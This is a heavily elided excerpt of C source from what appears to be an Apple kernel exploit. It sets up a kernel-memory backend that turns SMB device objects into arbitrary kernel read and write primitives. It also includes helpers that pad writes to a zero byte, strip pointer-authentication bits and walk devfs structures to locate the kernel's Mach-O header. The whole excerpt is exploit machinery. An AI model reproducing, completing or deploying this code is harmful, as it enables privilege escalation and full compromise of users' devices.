...
int kmem_boostrap_setup_dev(struct kmem_bootstrap* kmem, bootstrap_dev_t dev, dev_config_t config) {
    ...
    switch (config) {
        ...
        case DEV_WRITE:
            ...
            break;
        default:
            xpl_log_error("invalid config %d", config);
            xpl_abort();
    }
    ...
    if (error) {
        xpl_log_warn("write failed for smb_dev_rw with fd_dev: %d. smb_dev_rw will be deactivated", smb_dev_rw_get_dev_fd(dev->dev));
...
bootstrap_dev_t kmem_bootstrap_get_dev(struct kmem_bootstrap* kmem, dev_config_t config) {
    xpl_assert(config == DEV_READ || config == DEV_WRITE);
    ...
    xpl_log_error("no smb_dev_rw left");
    xpl_abort();
}
...
int kmem_boostrap_try_write(struct kmem_bootstrap* kmem, uintptr_t dst, const void* src, uint32_t size) {
    ...
    if (size >= block_size) {
        ...
        last_byte = xpl_kmem_read_uint8(write_end - 1, 0);
    }

    /// Find the write end position such that last byte is zero
    while (last_byte) {
        last_byte = xpl_kmem_read_uint8(write_end++, 0);
    }
    
    size_t write_size = write_end - write_start;
    xpl_assert_cond(write_size, >=, size);
    xpl_assert_cond(write_size, >=, block_size);
    ...
    xpl_kmem_read(write_data + size, write_start + size, 0, write_size - size);
    
    /// Make sure last byte is zero
    xpl_assert_cond(write_data[write_size - 1], ==, '\0');
    
    /// No xpl_kmem_read* after this point. Doing so may reconfigure the `dev`
    /// for read and write will fail
    bootstrap_dev_t dev = kmem_bootstrap_get_dev(kmem, DEV_WRITE);
    xpl_assert(dev->config == DEV_WRITE);
    xpl_assert_cond(smb_dev_rw_get_session(dev->dev), ==, kmem_write_session_get_addr(kmem->write_session));
    ...
    while (cursor < write_size) {
        ...
        if (end < write_size) {
            ...
            xpl_assert_cond(block[sizeof(block) - 1], ==, 0);
            end = write_size;
        }
...
int kmem_boostrap_try_read(struct kmem_bootstrap* kmem, void* dst, uintptr_t src, uint32_t size) {
    ...
    xpl_assert(dev->config == DEV_READ);
...
void kmem_bootstrap_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xpl_assert_cond(size, <=, MAX_READ_SIZE);
...
void kmem_bootstrap_write(void* ctx, uintptr_t dst, const void* src, size_t size) {
    xpl_assert_cond(size, <=, MAX_WRITE_SIZE);
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)ctx;
    int error;
    do {
...
static const struct xpl_kmem_ops kmem_ro_ops = {
...
xpl_kmem_backend_t kmem_bootstrap_create(const struct sockaddr_in* smb_addr) {
    ...
    return xpl_kmem_backend_create(&kmem_ro_ops, kmem);
}

uintptr_t kmem_bootstrap_get_mh_execute_header(xpl_kmem_backend_t backend) {
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)xpl_kmem_backend_get_ctx(backend);
    ...
    uintptr_t de_dnp = xpl_kmem_read_uint64(devfs, TYPE_DEVDIRENT_MEM_DE_DNP_OFFSET);
    uintptr_t dn_ops = xpl_kmem_read_uint64(de_dnp, TYPE_DEVNODE_MEM_DN_OPS_OFFSET);
    uintptr_t vn_default_error = xpl_ptrauth_strip(xpl_kmem_read_uint64(xpl_kmem_read_uint64(dn_ops, 0), 0));
...
void kmem_bootstrap_destroy(xpl_kmem_backend_t* backend_p) {
    struct kmem_bootstrap* kmem = xpl_kmem_backend_get_ctx(*backend_p);
    for (int i=0; i<kmem->num_devs; i++) {
